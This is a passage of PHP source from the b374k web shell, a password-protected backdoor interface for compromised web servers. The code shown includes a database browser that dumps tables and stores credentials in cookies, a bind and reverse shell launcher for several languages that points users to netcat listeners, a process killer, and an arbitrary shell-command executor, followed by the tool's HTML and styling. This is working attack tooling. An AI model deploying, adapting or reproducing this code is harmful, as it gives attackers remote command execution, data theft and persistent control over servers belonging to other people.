			$s_con = sql_connect($s_sql['type'],$s_sql['host'],$s_sql['user'],$s_sql['pass']);
			$s_sqlcode = isset($_GP['sqlcode'])? $_GP['sqlcode'] : "";

			if($s_con!==false){
				if(isset($_GP['sqlinit'])){
					$s_sql_cookie = (function_exists("json_encode") && function_exists("json_decode"))? json_encode($s_sql):serialize($s_sql);
					$s_c_num = substr(md5(time().rand(0,100)),0,3);
					while(isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($s_c_num, $_COOKIE['c'])){
						$s_c_num = substr(md5(time().rand(0,100)),0,3);
					}
					setcookie("c[".$s_c_num."]", $s_sql_cookie ,time() + $s_login_time);
				}
				$s_show_form = false;
				$s_result .= "<form action='".$s_self."' method='post'>
					<input type='hidden' name='sqlhost' value='".$s_sql['host']."' />
					<input type='hidden' name='sqlport' value='".$s_sql['port']."' />
					<input type='hidden' name='sqluser' value='".$s_sql['user']."' />
					<input type='hidden' name='sqlpass' value='".$s_sql['pass']."' />
					<input type='hidden' name='sqltype' value='".$s_sql['type']."' />
					<input type='hidden' name='x' value='db' />
					<input type='hidden' name='connect' value='connect' />
					<textarea id='sqlcode' name='sqlcode' class='txtarea' style='height:150px;'>".hss($s_sqlcode)."</textarea>
					<p><input type='submit' name='gogo' class='inputzbut' value='Go !' style='width:120px;height:30px;' />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class='gaya'>[</span> ; <span class='gaya'>]</span></p>
					</form>";

				if(!empty($s_sqlcode)){
					$s_querys = explode(";",$s_sqlcode);
					foreach($s_querys as $s_query){
						if(trim($s_query) != ""){
							$s_hasil = sql_query($s_sql['type'],$s_query,$s_con);
							if($s_hasil!=false){
								$s_result .= "<hr /><p style='padding:0;margin:6px 10px;font-weight:bold;'>".hss($s_query).";&nbsp;&nbsp;&nbsp;
								<span class='gaya'>[</span> ok <span class='gaya'>]</span></p>";

								if(!is_bool($s_hasil)){
									$s_result .= "<table class='explore sortable' style='width:100%;'><tr>";
									for($s_i = 0; $s_i<sql_num_fields($s_sql['type'],$s_hasil); $s_i++)
										$s_result .= "<th>".@hss(sql_field_name($s_sql['type'],$s_hasil,$s_i))."</th>";
									$s_result .= "</tr>";
									while($s_rows=sql_fetch_data($s_sql['type'],$s_hasil)){
										$s_result .= "<tr>";
										foreach($s_rows as $s_r){
											if(empty($s_r)) $s_r = " ";
											$s_result .= "<td>".@hss($s_r)."</td>";
										}
										$s_result .= "</tr>";
									}
									$s_result .= "</table>";
								}
							}
							else{
								$s_result .= "<p style='padding:0;margin:6px 10px;font-weight:bold;'>".hss($s_query).";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> error <span class='gaya'>]</span></p>";
							}
						}
					}
				}
				else{
					if(($s_sql['type']!='pdo') && ($s_sql['type']!='odbc')){
						if($s_sql['type']=='mysql') $s_showdb = "SHOW DATABASES";
						elseif($s_sql['type']=='mssql') $s_showdb = "SELECT name FROM master..sysdatabases";
						elseif($s_sql['type']=='pgsql') $s_showdb = "SELECT schema_name FROM information_schema.schemata";
						elseif($s_sql['type']=='oracle') $s_showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME";
						elseif($s_sql['type']=='sqlite3' || $s_sql['type']=='sqlite') $s_showdb = "SELECT \"".$s_sql['host']."\"";
						else $s_showdb = "SHOW DATABASES";

						$s_hasil = sql_query($s_sql['type'],$s_showdb,$s_con);

						if($s_hasil!=false) {
							while($s_rows_arr=sql_fetch_data($s_sql['type'],$s_hasil)){
								foreach($s_rows_arr as $s_rows){
									$s_result .= "<p class='notif' onclick=\"toggle('db_".$s_rows."')\">".$s_rows."</p>";
									$s_result .= "<div class='info' id='db_".$s_rows."'><table class='explore'>";

									if($s_sql['type']=='mysql') $s_showtbl = "SHOW TABLES FROM ".$s_rows;
									elseif($s_sql['type']=='mssql') $s_showtbl = "SELECT name FROM ".$s_rows."..sysobjects WHERE xtype = 'U'";
									elseif($s_sql['type']=='pgsql') $s_showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$s_rows."'";
									elseif($s_sql['type']=='oracle') $s_showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$s_rows."'";
									elseif($s_sql['type']=='sqlite3' || $s_sql['type']=='sqlite') $s_showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
									else $s_showtbl = "";

									$s_hasil_t = sql_query($s_sql['type'],$s_showtbl,$s_con);
									if($s_hasil_t!=false) {
										while($s_tables_arr=sql_fetch_data($s_sql['type'],$s_hasil_t)){
											foreach($s_tables_arr as $s_tables){
												if($s_sql['type']=='mysql') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." LIMIT 0,100";
												elseif($s_sql['type']=='mssql') $s_dump_tbl = "SELECT TOP 100 * FROM ".$s_rows."..".$s_tables;
												elseif($s_sql['type']=='pgsql') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." LIMIT 100 OFFSET 0";
												elseif($s_sql['type']=='oracle') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." WHERE ROWNUM BETWEEN 0 AND 100;";
												elseif($s_sql['type']=='sqlite' || $s_sql['type']=='sqlite3') $s_dump_tbl = "SELECT * FROM ".$s_tables." LIMIT 0,100";
												else $s_dump_tbl = "";

												$s_dump_tbl_link = $s_self."x=db&connect=&sqlhost=".$s_sql['host']."&sqlport=".$s_sql['port']."&sqluser=".$s_sql['user']."&sqlpass=".$s_sql['pass']."&sqltype=".$s_sql['type']."&sqlcode=".$s_dump_tbl;

												$s_result .= "<tr><td ondblclick=\"return go('".adds($s_dump_tbl_link)."',event);\"><a href='".$s_dump_tbl_link."'>".$s_tables."</a></td></tr>";
											}
										}
									}
									$s_result .= "</table></div>";
								}
							}
						}
					}
				}
				sql_close($s_sql['type'],$s_con);
			}
			else{
				$s_result .= notif("Unable to connect to database");
				$s_show_form = true;
			}
		}

		if($s_show_form){
			// sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
			$s_sqllist = array();
			if(function_exists("mysql_connect")) $s_sqllist["mysql"] = "connect to MySQL <span class='desc' style='font-size:12px;'>- using mysql_*</span>";
			if(function_exists("mssql_connect") || function_exists("sqlsrv_connect")) $s_sqllist["mssql"] = "connect to MsSQL <span class='desc' style='font-size:12px;'>- using mssql_* or sqlsrv_*</span>";
			if(function_exists("pg_connect")) $s_sqllist["pgsql"] = "connect to PostgreSQL <span class='desc' style='font-size:12px;'>- using pg_*</span>";
			if(function_exists("oci_connect")) $s_sqllist["oracle"] = "connect to oracle <span class='desc' style='font-size:12px;'>- using oci_*</span>";
			if(function_exists("sqlite_open")) $s_sqllist["sqlite"] = "connect to SQLite <span class='desc' style='font-size:12px;'>- using sqlite_*</span>";
			if(class_exists("SQLite3")) $s_sqllist["sqlite3"] = "connect to SQLite3 <span class='desc' style='font-size:12px;'>- using class SQLite3</span>";
			if(function_exists("odbc_connect")) $s_sqllist["odbc"] = "connect via ODBC <span class='desc' style='font-size:12px;'>- using odbc_*</span>";
			if(class_exists("PDO")) $s_sqllist["pdo"] = "connect via PDO <span class='desc' style='font-size:12px;'>- using class PDO</span>";

			foreach($s_sqllist as $s_sql['type']=>$s_sqltitle){
				if($s_sql['type']=="odbc" || $s_sql['type']=="pdo"){
					$s_result .= "<div class='mybox'><h2>".$s_sqltitle."</h2>
					<form action='".$s_self."' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>DSN / Connection String</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					<tr><td>Username</td><td><input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /></td></tr>
					<tr><td>Password</td><td><input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='".$s_sql['type']."' />
					<input type='hidden' name='sqlinit' value='init' />
					<input type='hidden' name='x' value='db' />
					</form>
					</div>";
				}
				elseif($s_sql['type']=="sqlite" || $s_sql['type']=="sqlite3"){
					$s_result .= "<div class='mybox'><h2>".$s_sqltitle."</h2>
					<form action='".$s_self."' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>DB File</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='".$s_sql['type']."' />
					<input type='hidden' name='sqlinit' value='init' />
					<input type='hidden' name='x' value='db' />
					</form>
					</div>";
				}
				else{
					$s_result .= "<div class='mybox'><h2>".$s_sqltitle."</h2>
					<form action='".$s_self."' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>Host</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					<tr><td>Username</td><td><input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /></td></tr>
					<tr><td>Password</td><td><input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /></td></tr>
					<tr><td>Port (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='sqlport' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='".$s_sql['type']."' />
					<input type='hidden' name='sqlinit' value='init' />
					<input type='hidden' name='x' value='db' />
					</form>
					</div>";
				}
			}
		}
	} // bind and reverse shell
	elseif(isset($_GP['x']) && ($_GP['x']=='rs')){
		// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php
		$s_rshost = $s_server_ip;

		$s_rsport = "13123"; // default port
		$s_rspesana = "Press &#39;  Go !  &#39; button and run &#39;  nc <i>server_ip</i> <i>port</i>  &#39; on your computer";
		$s_rspesanb = "Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button";
		$s_rs_err = "";

		$s_rsbind = $s_rsback = array();

		$s_rsbind["bind_php"] = "Bind Shell <span class='desc' style='font-size:12px;'>- php</span>";
		$s_rsback["back_php"] = "Reverse Shell <span class='desc' style='font-size:12px;'>- php</span>";

		$s_access = array("s_python"=>"py", "s_perl"=>"pl", "s_ruby"=>"rb", "s_node"=>"js", "s_gcc"=>"c", "s_java"=>"java");
		foreach($s_access as $k=>$v){
			if(isset($$k)){
				$s_t = explode("_", $k);
				$s_rsbind["bind_".$v] = "Bind Shell <span class='desc' style='font-size:12px;'>- ".$s_t[1]."</span>";
				$s_rsback["back_".$v] = "Reverse Shell <span class='desc' style='font-size:12px;'>- ".$s_t[1]."</span>";
			}
		}

		if($s_win){
			$s_rsbind["bind_win"] = "Bind Shell <span class='desc' style='font-size:12px;'>- windows executable</span>";
			$s_rsback["back_win"] = "Reverse Shell <span class='desc' style='font-size:12px;'>- windows executable</span>";
		}
		$s_rslist = array_merge($s_rsbind,$s_rsback);

		if(!@is_writable($s_cwd)) $s_result .= notif("Directory ".$s_cwd." is not writable, please change to a writable one");

		foreach($s_rslist as $s_rstype=>$s_rstitle){
			$s_split = explode("_",$s_rstype);
			if($s_split[0]=="bind"){
				$s_rspesan = $s_rspesana;
				$s_rsdisabled = "disabled='disabled'";
				$s_rstarget = $s_server_ip;
				$s_labelip = "Server IP";
			}
			elseif($s_split[0]=="back"){
				$s_rspesan = $s_rspesanb;
				$s_rsdisabled = "";
				$s_rstarget = $s_my_ip;
				$s_labelip = "Target IP";
			}

			if(isset($_GP[$s_rstype])){
				if(isset($_GP["rshost_".$s_rstype])) $s_rshost_ = $_GP["rshost_".$s_rstype];
				if(isset($_GP["rsport_".$s_rstype])) $s_rsport_ = $_GP["rsport_".$s_rstype];

				if($s_split[0]=="bind") $s_rstarget_packed = $s_rsport_;
				elseif($s_split[0]=="back") $s_rstarget_packed = $s_rsport_." ".$s_rshost_;

				if($s_split[1]=="pl") $s_rscode = $s_rs_pl;
				elseif($s_split[1]=="py") $s_rscode = $s_rs_py;
				elseif($s_split[1]=="rb") $s_rscode = $s_rs_rb;
				elseif($s_split[1]=="js") $s_rscode = $s_rs_js;
				elseif($s_split[1]=="c") $s_rscode = $s_rs_c;
				elseif($s_split[1]=="java") $s_rscode = $s_rs_java;
				elseif($s_split[1]=="win") $s_rscode = $s_rs_win;
				elseif($s_split[1]=="php") $s_rscode = $s_rs_php;

				$s_buff = rs($s_rstype,$s_rstarget_packed,$s_rscode);
				if($s_buff!="") $s_rs_err = notif(hss($s_buff));
			}
			$s_result .= "<div class='mybox'><h2>".$s_rstitle."</h2>
			<form action='".$s_self."' method='post' />
			<table class='myboxtbl'>
			<tr><td style='width:100px;'>".$s_labelip."</td><td><input ".$s_rsdisabled." style='width:100%;' class='inputz' type='text' name='rshost_".$s_rstype."' value='".$s_rstarget."' /></td></tr>
			<tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='rsport_".$s_rstype."' value='".$s_rsport."' /></td></tr>
			</table>
			<input type='submit' name='".$s_rstype."' class='inputzbut' value='Go !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			&nbsp;&nbsp;<span>".$s_rspesan."</span>
			<input type='hidden' name='x' value='rs' />
			</form>
			</div>";
		}
		$s_result = $s_rs_err.$s_result;
	} // task manager
	elseif(isset($_GP['x']) && ($_GP['x']=='ps')){
		$s_buff = "";
		// kill process specified by pid
		if(isset($_GP['pid'])){
			$s_p = trim($_GP['pid'],"|");
			$s_parr = explode("|", $s_p);

			foreach($s_parr as $s_p){
				if(function_exists("posix_kill")) $s_buff .= (posix_kill($s_p,'9'))? notif("Process with pid ".$s_p." has been successfully killed"):notif("Unable to kill process with pid ".$s_p);
				else{
					if(!$s_win) $s_buff .= notif(exe("kill -9 ".$s_p));
					else $s_buff .= notif(exe("taskkill /F /PID ".$s_p));
				}
			}
		}

		if(!$s_win) $s_h = "ps aux"; // nix
		else $s_h = "tasklist /V /FO csv"; // win
		$s_wcount = 11;
		$s_wexplode = " ";
		if($s_win) $s_wexplode = "\",\"";

		$s_res = exe($s_h);
		if(trim($s_res)=='') $s_result = notif("Error getting process list");
		else{
			if($s_buff!="") $s_result = $s_buff;
			$s_result .= "<table class='explore sortable'>";
			if(!$s_win) $s_res = preg_replace('#\ +#',' ',$s_res);

			$s_psarr = explode("\n",$s_res);
			$s_fi = true;
			$s_tblcount = 0;

			$s_check = explode($s_wexplode,$s_psarr[0]);
			$s_wcount = count($s_check);

			foreach($s_psarr as $s_psa){
				if(trim($s_psa)!=''){
					if($s_fi){
						$s_fi = false;
						$s_psln = explode($s_wexplode, $s_psa, $s_wcount);
						$s_result .= "<tr><th style='width:24px;' class='sorttable_nosort'></th><th class='sorttable_nosort'>action</th>";
						foreach($s_psln as $s_p) $s_result .= "<th>".trim(trim(strtolower($s_p)) ,"\"")."</th>";
						$s_result .= "</tr>";
					}
					else{
						$s_psln = explode($s_wexplode, $s_psa, $s_wcount);
						$s_result .= "<tr>";
						$s_tblcount = 0;
						foreach($s_psln as $s_p){
							$s_pid = trim(trim($s_psln[1]),"\"");
							if(trim($s_p)=="") $s_p = "&nbsp;";
							if($s_tblcount == 0){
								$s_result .= "<td style='text-align:center;text-indent:4px;'><input id='".md5($s_pid)."' name='cbox' value='".$s_pid."' type='checkbox' class='css-checkbox' onchange='hilite(this);' /><label for='".md5($s_pid)."' class='css-label'></label></td><td style='text-align:center;'><a href='".$s_self."x=ps&pid=".$s_pid."'>kill</a></td>
										<td style='text-align:center;'>".trim(trim($s_p) ,"\"")."</td>";
								$s_tblcount++;
							}
							else{
								$s_tblcount++;
								if($s_tblcount == count($s_psln)) $s_result .= "<td style='text-align:left;'>".trim(trim($s_p) ,"\"")."</td>";
								else $s_result .= "<td style='text-align:center;'>".trim(trim($s_p) ,"\"")."</td>";
							}
						}
						$s_result .= "</tr>";
					}
				}
			}
			$colspan = count($s_psln)+1;
			$s_result .= "<tfoot><tr class='cbox_selected'><td class='cbox_all'>
			<form action='".$s_self."' method='post'><input id='checkalll' type='checkbox' name='abox' class='css-checkbox' onclick='checkall();' /><label for='checkalll' class='css-label'></label></form>
			</td><td style='text-indent:10px;padding:2px;' colspan=".$colspan."><a href='javascript: pkill();'>kill selected <span id='total_selected'></span></a></td>
			</tr></tfoot></table>";
		}
	}
	else{
		if(!isset($s_cwd)) $s_cwd = "";
		if(isset($_GP['cmd'])){
			$s_cmd = $_GP['cmd'];
			if(strlen($s_cmd) > 0){
				if(preg_match('#^cd(\ )+(.*)#',$s_cmd,$s_r)){
					$s_nd = trim($s_r[2]);
					if(@is_dir($s_nd)){
						chdir($s_nd);
						$s_cwd = cp(getcwd());
						setcookie("cwd", $s_cwd ,time() + $s_login_time);
						$s_result .= showdir($s_cwd);
					}
					elseif(@is_dir($s_cwd.$s_nd)){
						chdir($s_cwd.$s_nd);
						$s_cwd = cp(getcwd());
						setcookie("cwd", $s_cwd ,time() + $s_login_time);
						$s_result .= showdir($s_cwd);
					}
					else $s_result .= notif($s_nd." is not a directory");
				}
				else{
					$s_r = hss(exe($s_cmd));
					if($s_r != '') $s_result .= "<pre>".$s_r."</pre>";
					else $s_result .= showdir($s_cwd);
				}
			}
			else $s_result .= showdir($s_cwd);
		}
		else $s_result .= showdir($s_cwd);
	}

	// find drive letters
	$s_letters = '';
	$s_v = explode("\\",$s_cwd);
	$s_v = $s_v[0];
	foreach (range("A", "Z") as $s_letter){
		if(@is_readable($s_letter.":\\")){
			$s_letters .= "<a href='".$s_self."cd=".$s_letter.":\\'>[ ";
			if($s_letter.":" != $s_v) $s_letters .= $s_letter;
			else{$s_letters .= "<span class='drive-letter'>".$s_letter."</span>";}
			$s_letters .= " ]</a> ";
		}
	}

	// print useful info
	$s_info  = "<table class='headtbl'><tr><td>".$s_system."</td></tr>";
	$s_info .= "<tr><td>".$s_software."</td></tr>";
	$s_info .= "<tr><td>server ip : ".$s_server_ip."<span class='gaya'> | </span>your   ip : ".$s_my_ip;
	$s_info .= "<span class='gaya'> | </span> Time @ Server : ".@date("d M Y H:i:s",time());
	$s_info .= "</td></tr>
			<tr><td style='text-align:left;'>
				<table class='headtbls'><tr>
				<td>".trim($s_letters)."</td>
				<td>
				<span id='chpwd'>
				&nbsp;<a href=\"javascript:tukar_('chpwd','chpwdform')\">
				<span class='icon'></span>
				&nbsp;&nbsp;</a>".swd($s_cwd)."</span>
				<form action='".$s_self."' method='post' style='margin:0;padding:0;'>
				<span class='sembunyi' id='chpwdform'>
				&nbsp;<a href=\"javascript:tukar_('chpwdform','chpwd');\">
				<span class='icon'></span>
				</a>&nbsp;&nbsp;
				<input type='text' name='view' class='inputz' style='width:300px;' value='".$s_cwd."' />
				<input class='inputzbut' type='submit' name='submit' value='view file / folder' />
				</span>
				</form>
				</td></tr>
				</table>
			</td></tr>
			</table>";
}

$s_error = ob_get_contents();
if(!empty($s_error)) $s_result = notif($s_error).$s_result;
ob_end_clean();

?><!DOCTYPE html>
<html>
<head>
<title><?php echo $s_title; ?></title>
<meta charset="utf-8">
<meta name='robots' content='noindex, nofollow, noarchive'>
<link rel='SHORTCUT ICON' href='<?php echo $s_favicon; ?>'>
<link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700' rel='stylesheet' type='text/css'>
<style type='text/css'>
*{font-family:Ubuntu Mono,serif;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:0;}
body{background:<?php echo $s_color[0]; ?>;font-size:12px;color:<?php echo $s_color[1]; ?>;font-weight:400;}
hr{border-bottom:1px dashed <?php echo $s_color[2]; ?>;}
a{color:<?php echo $s_color[3]; ?>;text-decoration:none;}
a:hover{color:<?php echo $s_color[1]; ?>;}
pre{padding:0 8px;}
form{display:inline;}
table th,p{cursor:default;}
input:focus,select:focus,textarea:focus,button:focus{outline: none;}
#main{background:<?php echo $s_color[4]; ?>;-moz-border-radius:10px;border-radius:10px;width:100%;padding:2px 8px;}
#header{text-align:left;margin:0;padding:0;}
#header td{margin:0;padding:0;}
#header h1{font-size:20px;-webkit-transform:rotate(-13.37deg);-moz-transform:rotate(-13.37deg);-ms-transform:rotate(-13.37deg);-o-transform:rotate(-13.37deg);transform:rotate(-13.37deg);margin:0;padding:0;}
#header h1 a,.explorelist:hover a{color:<?php echo $s_color[1]; ?>;}
#menu{background:<?php echo $s_color[4]; ?>;margin:0 2px 4px;}
#result{-moz-border-radius:10px;border-radius:10px;border:1px solid <?php echo $s_color[3]; ?>;line-height:16px;background:<?php echo $s_color[4]; ?>;color:<?php echo $s_color[5]; ?>;margin:0 0 8px;padding:4px 8px;}
.headinfo{border-left:1px solid <?php echo $s_color[3]; ?>;margin:6px;padding:2px 0 0 16px;}
.headtbls tr{height:24px;vertical-align:middle;}
.gaya,.ver{color:<?php echo $s_color[3]; ?>;font-weight:700;}
.ver{-webkit-transform:rotate(-13.37deg);-moz-transform:rotate(-13.37deg);-ms-transform:rotate(-13.37deg);-o-transform:rotate(-13.37deg);transform:rotate(-13.37deg);letter-spacing:2px;}
.menumi{background:<?php echo $s_color[6]; ?>;color:<?php echo $s_color[3]; ?>;text-decoration:none;letter-spacing:2px;font-size:12px;-webkit-transform:rotate(-13.37deg);-moz-transform:rotate(-13.37deg);-ms-transform:rotate(-13.37deg);-o-transform:rotate(-13.37deg);transform:rotate(-13.37deg);-moz-border-radius:4px;border-radius:4px;margin:0;padding:4px 8px;}
.menumi:hover{background:<?php echo $s_color[7]; ?>;-webkit-transform:rotate(13.37deg);-moz-transform:rotate(13.37deg);-ms-transform:rotate(13.37deg);-o-transform:rotate(13.37deg);transform:rotate(13.37deg);}
.inputz,.prompt,.txtarea{background:<?php echo $s_color[4]; ?>;border:0;border-bottom:1px solid <?php echo $s_color[7]; ?>;font-size:12px;color:<?php echo $s_color[1]; ?>;padding:2px;}
.prompt{font-weight:700;}
.txtarea{width:100%;height:370px;}
.inputzbut{font-size:12px;background:<?php echo $s_color[8]; ?>;color:<?php echo $s_color[3]; ?>;border:1px solid <?php echo $s_color[2]; ?>;margin:0 4px;}
.but{float:left;background:<?php echo $s_color[3]; ?>;color:<?php echo $s_color[0]; ?>;margin:0 4px 0 0;font-size:20px;width:16px;height:16px;border-radius:50%;text-align:center;padding:0;line-height:12px;cursor:default}
.explore{width:100%;padding:4px 0;}
.explore a{text-decoration:none;}
.explore td{border-bottom:1px solid <?php echo $s_color[2]; ?>;line-height:24px;padding:0 8px;vertical-align:top;}
.explore th{font-weight:700;background:<?php echo $s_color[2]; ?>;padding:6px 8px;}
.explore tr:hover{background:<?php echo $s_color[8]; ?>;}
.sembunyi{display:none;margin:0;padding:0;}
.info table{width:100%;border-radius:6px;border:1px solid <?php echo $s_color[3]; ?>;margin:4px 0;padding:8px;}
.info th,th{background:<?php echo $s_color[8]; ?>;font-weight:700;}
.info td{border-bottom:1px solid <?php echo $s_color[2]; ?>;}
.info h2{text-align:center;font-size:15px;background:<?php echo $s_color[8]; ?>;letter-spacing:6px;border-radius:6px;border-bottom:1px solid <?php echo $s_color[3]; ?>;margin:4px 0 8px;padding:10px;}
.info a{color:<?php echo $s_color[10]; ?>;}
.viewfile{width:100%;border-bottom:1px solid <?php echo $s_color[2]; ?>;margin:0 0 4px;}
.viewfile td{border-bottom:1px solid <?php echo $s_color[2]; ?>;background:<?php echo $s_color[8]; ?>;height:24px;padding:2px 4px;}
.viewfilecontent{padding:11px 8px;}
.mybox{-moz-border-radius:10px;border-radius:10px;border:1px solid <?php echo $s_color[3]; ?>;margin:4px 0 8px;padding:14px 8px;}
.mybox h2{border-bottom:1px solid <?php echo $s_color[9]; ?>;color:<?php echo $s_color[3]; ?>;margin:0;padding:0 0 8px;}
.notif{background:<?php echo $s_color[3]; ?>;color:<?php echo $s_color[0]; ?>;border-radius:6px;font-weight:700;margin:3px 0;padding:4px 8px 2px;}
.notif a{color:<?php echo $s_color[0]; ?>;}
.footer{text-align:right;font-size:10px;letter-spacing:2px;color:<?php echo $s_color[2]; ?>;padding:0 16px;}
.headtbl,.myboxtbl{width:100%;}
input[type=checkbox].css-checkbox + label.css-label{padding-left:20px;height:15px;display:inline-block;line-height:15px;background-repeat:no-repeat;background-position:0 0;vertical-align:middle;cursor:pointer;}
input[type=checkbox].css-checkbox:checked + label.css-label{background-position:0 -15px;}
.info,.info h1,.info hr,input[type=checkbox].css-checkbox{display:none;}
.css-label{background-image:url(<?php echo $s_checkbox; ?>);}
.icon{background:url(<?php echo $s_favicon; ?>);margin:6px 0;border:0;padding:1px 8px 0 8px;}
.drive-letter{color:<?php echo $s_color[1]; ?>;}
.desc{color:<?php echo $s_color[11]; ?>;}
.cbox_selected{background-color:<?php echo $s_color[12]; ?>;}
.cbox_all{text-align:center;text-indent:4px;}
.schemabox{background-color:<?php echo $s_color[3]; ?>;border-radius:2px;}
.border-bottom{border-bottom:1px solid <?php echo $s_color[7]; ?>;}
.border-top{border-top:1px solid <?php echo $s_color[7]; ?>;}
#navigation{position:fixed;left:-16px;top:46%;}
#totop,#tobottom{background:url(<?php echo $s_arrow; ?>);width:32px;height:32px;opacity:0.30;margin:12px 0;}
#totop:hover,#tobottom:hover{opacity:0.80;}
#tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV";}
</style>
</head>
<body>
<table id='main'><tr><td>
<?php if($s_auth){?>
	<div><span style='float:right;'><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>b374k</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>	<td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
	<div style='clear:both;'></div>
	<form method='post' name='g'></form>
	<div id='menu'>
		<table style='width:100%;'><tr>
		<td><a href='<?php echo $s_self; ?>' title='Explorer'><div class='menumi'>xpl</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=ps' title='Display process status'><div class='menumi'>ps</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=eval' title='Execute code'><div class='menumi'>eval</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=info' title='Information about server'><div class='menumi'>info</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=db' title='Connect to database'><div class='menumi'>db</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=rs' title='Remote Shell'><div class='menumi'>rs</div></a></td>
		<td style='width:100%;padding:0 0 0 6px;'>
		<span class='prompt'><?php echo $s_prompt; ?></span><form action='<?php echo $s_self; ?>' method='post'>
		<input id='cmd' onclick="clickcmd();" class='inputz' type='text' name='cmd' style='width:70%;' value='<?php
if(isset($_GP['cmd'])) echo "";
else echo "- shell command -";
?>' />
		<noscript><input class='inputzbut' type='submit' value='Go !' name='submitcmd' style='width:80px;' /></noscript>
		</form>
		</td>
		</tr></table>
	</div>
	<div id='content'>
		<div id='result'><?php echo $s_result; ?></div>
	</div>
	<div id='navigation'>
	<div id='totop' onclick='totopd();' onmouseover='totop();' onmouseout='stopscroll();'></div>
	<div id='tobottom' onclick='tobottomd();' onmouseover='tobottom();' onmouseout='stopscroll();'></div>
	</div>
<?php } else{ ?>
	<div style='width:100%;text-align:center;'>
	<form action='<?php echo $s_self; ?>' method='post'>
	<img src='<?php echo $s_favicon; ?>' style='margin:2px;vertical-align:middle;' />
	b374k&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
	<input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;' />
	</form>
	</div>
<?php }?>	</td></tr></table>
<p class='footer'>Jayalah Indonesiaku &copy;<?php echo @date("Y",time())." "; ?>b374k</p>
<script type='text/javascript'>
<?php echo gzinflate(base64_decode($s_sortable_js)).gzinflate(base64_decode($s_domready_js)); ?>
</script>
<script type='text/javascript'>
var d = document;
var scroll = false;
var cwd = '<?php echo adds($s_cwd); ?>';
var hexstatus = false;
var timer = '';

domready(function(){
	<?php if(isset($_GP['cmd'])) echo "if(d.getElementById('cmd')) d.getElementById('cmd').focus();"; ?>
	<?php if(isset($_GP['evalcode'])) echo "if(d.getElementById('evalcode')) d.getElementById('evalcode').focus();"; ?>
	<?php if(isset($_GP['sqlcode'])) echo "if(d.getElementById('sqlcode')) d.getElementById('sqlcode').focus();"; ?>
	<?php if(isset($_GP['login'])) echo "if(d.getElementById('login')) d.getElementById('login').focus();"; ?>
	<?php if(isset($_GP['hexedit'])) echo "showhex();"; ?>

	if(d.getElementById('cmd')) d.getElementById('cmd').setAttribute('autocomplete', 'off');

	var textareas = d.getElementsByTagName('textarea');
	var count = textareas.length;
	for(i = 0; i<count; i++){
		textareas[i].onkeydown = function(e){
			if(e.keyCode==9){
				e.preventDefault();
				var s = this.selectionStart;
				this.value = this.value.substring(0,this.selectionStart) + "\t" + this.value.substring(this.selectionEnd);
				this.selectionEnd = s+1;
			}
			else if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
				this.form.submit();
			}
		}
	}
	listen();
});
function is_array(var_to_tes){
	return (Object.prototype.toString.call(var_to_tes) === '[object Array]')? true:false;
}
function listen(){
	var x = d.getElementsByTagName("a");
	for(i = 0; i<x.length; i++){
